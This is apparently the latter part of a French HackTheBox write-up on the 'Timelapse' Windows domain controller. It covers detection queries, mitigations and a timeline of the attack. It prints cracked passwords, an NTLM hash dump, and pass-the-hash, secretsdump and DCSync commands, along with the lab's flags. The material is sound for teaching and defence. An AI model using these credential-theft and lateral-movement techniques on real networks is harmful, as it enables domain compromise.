# Event ID 5140 - Partage réseau accédé
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 5140 -and
    $_.Message -match "\\\\Shares"
}
```

**Mitigations :**

1. **Désactiver accès anonyme :**

```powershell
# Via GPO : Computer Configuration → Windows Settings → Security Settings
# → Local Policies → Security Options
# → Network access: Do not allow anonymous enumeration of SAM accounts and shares = Enabled

# Via Registre
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 1
```

2. **Désactiver SMBv1 (vulnérable) :**

```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
```

3. **Exiger signature SMB :**

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

4. **Auditer accès aux partages :**

```powershell
# Activer l'audit d'accès aux objets
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
```

### 🛡️ Détection Cracking de Fichiers

**Event IDs :**

```powershell
# Event ID 4663 - Tentative d'accès à un objet
# Surveillance des fichiers .zip, .pfx téléchargés
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4663 -and
    ($_.Message -match "\.zip" -or $_.Message -match "\.pfx")
}
```

**Mitigations :**

1. **Mots de passe forts (20+ caractères) :**

```powershell
# Politique de mot de passe pour archives
# Utiliser gestionnaire de mots de passe (KeePass, 1Password, etc.)
# Exemple : "Correct-Horse-Battery-Staple-2025!@#$"
```

2. **Chiffrement des fichiers sensibles :**

```powershell
# Utiliser EFS ou BitLocker
cipher /e C:\SensitiveFiles
```

3. **DLP (Data Loss Prevention) :**
   - Bloquer upload de fichiers .pfx/.p12 sur partages
   - Scanner les fichiers pour credentials hardcodés

### 🛡️ Détection WinRM Certificate Auth

**Event IDs :**

```powershell
# Event ID 4624 - Logon via certificat
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[10].Value -eq "3" -and  # Logon Type = Network
    $_.Message -match "Certificate"
}

# Event ID 4648 - Logon avec credentials explicites
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4648
}

# Logs WinRM spécifiques
Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational" | Where-Object {
    $_.Message -match "Certificate"
}
```

**Mitigations :**

1. **Restreindre WinRM :**

```powershell
# Limiter les IPs autorisées
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.0/24"

# Désactiver WinRM si non nécessaire
Stop-Service WinRM
Set-Service WinRM -StartupType Disabled
```

2. **Authentification multi-facteurs (MFA) :**
   - Utiliser Smart Cards au lieu de certificats simples
   - Implémenter Conditional Access (Azure AD)

3. **Certificate Revocation Lists (CRL) :**

```powershell
# Forcer vérification CRL
Set-Item WSMan:\localhost\Service\Auth\Certificate -Value $true
```

### 🛡️ Détection PowerShell History Dumping

**Event IDs :**

```powershell
# Event ID 4663 - Accès au fichier ConsoleHost_history.txt
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4663 -and
    $_.Message -match "ConsoleHost_history.txt"
}

# Script Block Logging (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {
    $_.Id -eq 4104 -and
    $_.Message -match "ConsoleHost_history"
}
```

**Mitigations Critiques :**

1. **❌ NE JAMAIS mettre de credentials en clair dans des scripts :**

```powershell
# ❌ MAUVAIS
$password = "MyP@ssw0rd123!"

# ✅ BON - Utiliser Get-Credential
$creds = Get-Credential

# ✅ BON - Utiliser DPAPI pour stockage sécurisé
$securePass = Read-Host -AsSecureString "Enter password"
$encrypted = $securePass | ConvertFrom-SecureString
$encrypted | Out-File C:\secure\cred.txt

# Pour réutiliser
$securePass = Get-Content C:\secure\cred.txt | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential("user", $securePass)
```

2. **Désactiver ou limiter l'historique :**

```powershell
# Désactiver l'historique (pas recommandé pour détection)
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Limiter la taille de l'historique
Set-PSReadlineOption -MaximumHistoryCount 100
```

3. **Nettoyage régulier :**

```powershell
# Script de nettoyage automatique
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force
}
```

4. **Monitoring PowerShell :**

```powershell
# Activer Transcription (enregistre TOUT)
$RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
New-Item -Path $RegPath -Force
Set-ItemProperty -Path $RegPath -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path $RegPath -Name "OutputDirectory" -Value "C:\PSLogs"

# Activer Script Block Logging
$RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $RegPath -Force
Set-ItemProperty -Path $RegPath -Name "EnableScriptBlockLogging" -Value 1
```

### 🛡️ Détection & Hardening LAPS

**Event IDs :**

```powershell
# Event ID 4662 - Opération effectuée sur un objet AD
# Surveillance lecture de ms-Mcs-AdmPwd
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4662 -and
    $_.Message -match "ms-Mcs-AdmPwd"
}

# Event ID 4624 - Logon avec password LAPS
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[5].Value -eq "Administrator"
}
```

**Script de Monitoring LAPS :**

```powershell
# Surveiller qui lit les passwords LAPS
$Events = Get-WinEvent -LogName Security -MaxEvents 1000 | Where-Object {
    $_.Id -eq 4662 -and
    $_.Properties[6].Value -match "ms-Mcs-AdmPwd"
}

foreach ($Event in $Events) {
    [PSCustomObject]@{
        Time = $Event.TimeCreated
        User = $Event.Properties[1].Value
        Computer = $Event.Properties[8].Value
        Action = "LAPS Password Read"
    }
}
```

**Mitigations Critiques :**

1. **Restreindre le groupe LAPS_Readers :**

```powershell
# Auditer les membres
Get-ADGroupMember "LAPS_Readers" | Select-Object Name, SamAccountName

# Retirer utilisateurs non autorisés
Remove-ADGroupMember -Identity "LAPS_Readers" -Members svc_deploy -Confirm:$false
```

2. **Implémenter LAPS avec chiffrement (Windows LAPS) :**

```powershell
# Windows LAPS (depuis Windows Server 2025 / Windows 11 22H2)
# Chiffre le mot de passe dans AD avec DPAPI
Set-LapsADPasswordExpirationTime -Identity "DC01" -WhenEffective (Get-Date).AddDays(1)
```

3. **Alertes en temps réel :**

```powershell
# Script de détection en temps réel
Register-WMIEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 4662" -Action {
    $Event = $EventArgs.NewEvent.TargetInstance
    if ($Event.Message -match "ms-Mcs-AdmPwd") {
        Send-MailMessage -To "soc@company.com" -Subject "LAPS Password Access" -Body $Event.Message
    }
}
```

4. **Rotation fréquente :**

```powershell
# Forcer rotation immédiate
Set-AdmPwdComputerSelfPermission -Identity "DC01"
Reset-AdmPwdPassword -ComputerName "DC01"
```

### 🛡️ Détection Pass-the-Hash

**Event IDs :**

```powershell
# Event ID 4624 - Logon Type 3 (Network) avec NTLM
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[8].Value -eq "3" -and  # Logon Type = Network
    $_.Properties[10].Value -eq "10"     # Authentication Package = NTLM
}

# Event ID 4625 - Échec de logon (tentatives multiples)
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4625
}
```

**Script de Détection Pass-the-Hash :**

```powershell
# Détecter logons suspects (même hash, IPs différentes)
$LogonEvents = Get-WinEvent -LogName Security -MaxEvents 10000 | Where-Object {
    $_.Id -eq 4624 -and $_.Properties[8].Value -eq "3"
}

$Logons = $LogonEvents | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.Properties[5].Value
        SourceIP = $_.Properties[18].Value
        LogonType = $_.Properties[8].Value
    }
}

# Grouper par utilisateur et détecter anomalies
$Logons | Group-Object User | Where-Object {
    $_.Group.SourceIP | Select-Object -Unique | Measure-Object | Select-Object -ExpandProperty Count -gt 5
} | Select-Object Name, Count
```

**Mitigations :**

1. **Désactiver NTLM (si possible) :**

```powershell
# Via GPO : Computer Configuration → Windows Settings → Security Settings
# → Local Policies → Security Options
# → Network security: LAN Manager authentication level = Send NTLMv2 response only. Refuse LM & NTLM

# Via Registre
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
```

2. **Protected Users Security Group :**

```powershell
# Ajouter utilisateurs sensibles (empêche NTLM, DES, RC4)
Add-ADGroupMember -Identity "Protected Users" -Members Administrator, svc_deploy
```

3. **Credential Guard (Windows 10/11/Server 2016+) :**

```powershell
# Activer Credential Guard (protection hardware-based)
Enable-WindowsOptionalFeature -FeatureName VirtualMachinePlatform -Online -NoRestart
bcdedit /set {default} hypervisorlaunchtype auto
```

---

## 🔟 TIMELINE DÉTAILLÉE

| Temps | Action | Résultat |
|-------|--------|----------|
| T+0 | Nmap port scan | DC Windows identifié (53, 88, 389, 445, 5986) |
| T+5 | Nmap service scan | Domain: timelapse.htb, Hostname: DC01 |
| T+10 | SMB enumeration (anonymous) | Partage "Shares" accessible |
| T+15 | SMB navigation | Dossiers Dev/ et HelpDesk/ découverts |
| T+18 | SMB download | winrm_backup.zip téléchargé (2.6 KB) |
| T+20 | Tentative extraction ZIP | Protégé par mot de passe ❌ |
| T+22 | zip2john conversion | Hash généré pour John |
| T+25 | John cracking (ZIP) | **supremelegacy** (3 secondes) |
| T+27 | Extraction ZIP | legacyy_dev_auth.pfx obtenu |
| T+30 | Tentative extraction PFX | Protégé par mot de passe ❌ |
| T+32 | pfx2john conversion | Erreur asn1crypto ❌ |
| T+35 | Installation asn1crypto | `sudo apt install python3-asn1crypto` |
| T+37 | pfx2john retry | Hash généré pour John |
| T+40 | John cracking (PFX) | **thuglegacy** (5 secondes) |
| T+42 | OpenSSL extraction clé | key.pem généré |
| T+43 | OpenSSL extraction cert | cert.pem généré |
| T+45 | Inspection certificat | UPN: legacyy@timelapse.htb découvert |
| T+48 | Evil-WinRM connexion (cert) | ✅ **Accès legacyy** |
| T+50 | Énumération utilisateur | Membre de Remote Management Users |
| T+52 | Lecture user flag | **USER FLAG** 🏁 |
| T+55 | PowerShell history dump | Credentials svc_deploy trouvés ! |
| T+58 | Evil-WinRM connexion (svc_deploy) | ✅ **Accès svc_deploy** |
| T+60 | Énumération groupes | Membre de **LAPS_Readers** découvert |
| T+62 | Get-ADComputer enumeration | DC01 identifié |
| T+65 | LAPS password dump | **Password Administrator récupéré** |
| T+68 | Evil-WinRM connexion (Administrator) | ✅ **Accès Administrator** |
| T+70 | Recherche root flag | Trouvé dans C:\Users\TRX\Desktop\ |
| T+72 | Tentative lecture directe | Access Denied ❌ |
| T+75 | impacket-secretsdump | Tous les hashes NTLM dumpés |
| T+78 | Identification hash TRX | **4c7121d35cd421cbbd3e44ce83bc923e** |
| T+80 | Evil-WinRM Pass-the-Hash (TRX) | ✅ **Accès TRX** |
| T+82 | Lecture root flag | **ROOT FLAG** 🏁 |

**Temps total :** ~82 minutes

---

## 1️⃣1️⃣ OUTILS UTILISÉS

| Outil | Version | Usage | Commande Clé |
|-------|---------|-------|--------------|
| **Nmap** | 7.94SVN | Port scanning, service detection | `nmap -p- -sCV 10.10.11.152` |
| **smbclient** | 4.17.12 | Énumération SMB, download fichiers | `smbclient -L //10.10.11.152 -N` |
| **John the Ripper** | 1.9.0-jumbo | Cracking ZIP/PFX | `john hash.john --wordlist=rockyou.txt` |
| **OpenSSL** | 3.0.11 | Extraction certificat/clé privée | `openssl pkcs12 -in file.pfx -out cert.pem` |
| **Evil-WinRM** | 3.5 | Connexion WinRM, exploitation | `evil-winrm -i IP -c cert.pem -k key.pem -S` |
| **impacket-secretsdump** | 0.11.0 | Dump secrets AD (NTDS.dit) | `impacket-secretsdump user:pass@IP` |
| **PowerShell** | 5.1 | Énumération AD, LAPS | `Get-ADComputer -Properties ms-Mcs-AdmPwd` |

---

## 1️⃣2️⃣ LEÇONS APPRISES

### ✅ Bonnes Pratiques Offensives

1. **Toujours vérifier SMB Anonymous :**
   - Première chose à tester sur un DC Windows
   - Souvent mal configuré en environnement dev/test

2. **Cracking progressif :**
   - ZIP → PFX → Certificat (chaque couche révèle la suivante)
   - Utiliser `rockyou.txt` en premier (rapide, souvent suffisant)

3. **PowerShell History = Goldmine :**
   - Chemin: `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
   - Contient souvent des credentials en clair

4. **LAPS Abuse :**
   - Si membre de LAPS_Readers → Admin local garanti
   - Vérifier attribut `ms-Mcs-AdmPwd` sur tous les computers

5. **Pass-the-Hash > Cracking :**
   - Pas besoin de craquer les hashes
   - Fonctionne même avec mots de passe très complexes

### ❌ Vulnérabilités Critiques Identifiées

| Vulnérabilité | Impact | Recommandation |
|---------------|--------|----------------|
| **SMB Anonymous Access** | Exposition de fichiers sensibles | Désactiver null sessions, restreindre partages |
| **Mots de passe faibles (ZIP/PFX)** | Cracking en secondes | Utiliser 20+ caractères, gestionnaire MDP |
| **Credentials en clair (PS History)** | Compromission instantanée | Utiliser Get-Credential, jamais hardcoder |
| **LAPS_Readers trop permissif** | Accès admin local sur toutes machines | Limiter strictement les membres |
| **ACLs permissives** | Accès non autorisé aux fichiers | Auditer régulièrement les permissions NTFS |
| **NTLM activé** | Pass-the-Hash possible | Migrer vers Kerberos-only, Protected Users |

### 🛡️ Recommandations Défensives Prioritaires

**Criticité HAUTE (à implémenter immédiatement) :**

1. ✅ Désactiver accès SMB anonyme
2. ✅ Activer PowerShell Transcription + Script Block Logging
3. ✅ Restreindre groupe LAPS_Readers (seulement Tier 0 admins)
4. ✅ Implémenter alertes sur lecture ms-Mcs-AdmPwd

**Criticité MOYENNE (à planifier) :**

5. ✅ Désactiver SMBv1
6. ✅ Forcer signature SMB
7. ✅ Rotation LAPS plus fréquente (7 jours au lieu de 30)
8. ✅ Utiliser Protected Users pour comptes sensibles

**Criticité BASSE (nice-to-have) :**

9. ✅ Migrer vers Windows LAPS (chiffrement password)
10. ✅ Credential Guard sur toutes les machines
11. ✅ MFA pour WinRM
12. ✅ Certificate Revocation Lists (CRL)

---

## 📚 RESSOURCES

### Documentation Officielle
- [Microsoft LAPS Documentation](https://learn.microsoft.com/windows-server/identity/laps/laps-overview)
- [WinRM Configuration](https://learn.microsoft.com/windows/win32/winrm/installation-and-configuration-for-windows-remote-management)
- [PowerShell Logging](https://learn.microsoft.com/powershell/scripting/security/security-features)
- [Active Directory Security Best Practices](https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)

### Outils et Frameworks
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Impacket Suite](https://github.com/fortra/impacket)
- [John the Ripper](https://www.openwall.com/john/)
- [LAPS Toolkit](https://github.com/kfosaaen/Get-LAPSPasswords)

### Articles et Recherches
- [HackTricks - LAPS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [ADSecurity - PowerShell History](https://adsecurity.org/?p=3299)
- [SpecterOps - Pass-the-Hash](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)

---

## 📊 SCHÉMA D'EXPLOITATION

```
┌─────────────────────────────────────────────────────────────┐
│                    CHAÎNE D'ATTAQUE TIMELAPSE               │
└─────────────────────────────────────────────────────────────┘

[1] ACCÈS INITIAL
    SMB Anonymous (445)
         ↓
    Shares\Dev\winrm_backup.zip
         ↓ [zip2john + john]
    Password: supremelegacy
         ↓
    legacyy_dev_auth.pfx
         ↓ [pfx2john + john]
    Password: thuglegacy
         ↓
    Certificate + Private Key
         ↓
    ┌──────────────────────────┐
    │  WinRM Certificate Auth  │
    │  Port 5986 (HTTPS)       │
    │  User: legacyy           │
    └──────────────────────────┘

[2] ÉLÉVATION DE PRIVILÈGES
    PowerShell History
    ($env:APPDATA\...\ConsoleHost_history.txt)
         ↓
    Credentials en clair:
    svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
         ↓
    ┌──────────────────────────┐
    │  WinRM Password Auth     │
    │  User: svc_deploy        │
    │  Group: LAPS_Readers     │
    └──────────────────────────┘

[3] ABUS LAPS
    Get-ADComputer -Properties ms-Mcs-AdmPwd
         ↓
    Password Administrator:
    I)}73pmp{9+;E2/kWv0LZ7Tt
         ↓
    ┌──────────────────────────┐
    │  WinRM Admin Auth        │
    │  User: Administrator     │
    │  (Compte local DC01)     │
    └──────────────────────────┘

[4] POST-EXPLOITATION
    impacket-secretsdump
         ↓
    NTDS.dit dump:
    - Administrator: 22d04d77cc32a59f9fe6701aa9ffafb0
    - krbtgt:        2960d580f05cd511b3da3d3663f3cb37
    - TRX:           4c7121d35cd421cbbd3e44ce83bc923e ⭐
         ↓
    Pass-the-Hash (TRX)
         ↓
    ┌──────────────────────────┐
    │  Evil-WinRM PTH          │
    │  User: TRX               │
    │  Hash: 4c7121d3...       │
    └──────────────────────────┘
         ↓
    🏁 ROOT FLAG (C:\Users\TRX\Desktop\root.txt)
```

---

## 🏁 FLAGS

- **User Flag :** `c5f8ed1478d7f0a3d0ac7403e16b5854`  
  Location: `C:\Users\legacyy\Desktop\user.txt`

- **Root Flag :** `6506078077b79f2969f0a0a69fe4eddf`  
  Location: `C:\Users\TRX\Desktop\root.txt`

---

## 📝 NOTES FINALES

**Pourquoi le root flag est chez TRX et pas Administrator ?**

Cette configuration est intentionnelle par HTB pour enseigner :

1. **Les ACLs Windows ≠ Permissions AD**
   - Même Domain Admin peut être bloqué par NTFS ACLs
   
2. **Post-exploitation complète nécessaire**
   - Pas seulement "devenir admin" → explorer tous les utilisateurs
   
3. **Pass-the-Hash = Technique essentielle**
   - Mouvement latéral sans mot de passe

**Ce qu'on aurait pu faire autrement :**

1. **Modifier les ACLs** (mais destructif) :
```powershell
takeown /f C:\Users\TRX\Desktop\root.txt
icacls C:\Users\TRX\Desktop\root.txt /grant Administrator:F
```

2. **Utiliser PsExec** avec hash Administrator :
```bash
impacket-psexec -hashes :22d04d77cc32a59f9fe6701aa9ffafb0 Administrator@10.10.11.152
```

3. **DCSync Attack** (extraire tous les hashes via Kerberos) :
```bash
impacket-secretsdump -just-dc-ntlm timelapse.htb/Administrator@10.10.11.152 -hashes :22d04d77cc32a59f9fe6701aa9ffafb0
```

---

**📅 Terminé le :** 13/12/2025  
**⏱️ Durée :** ~82 minutes  
**✅ Statut :** Pwned  
**🎓 Difficulté :** Easy (mais pédagogique !)

---

*Ce write-up a été réalisé dans un cadre éducatif légal sur HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés avec permission explicite.*
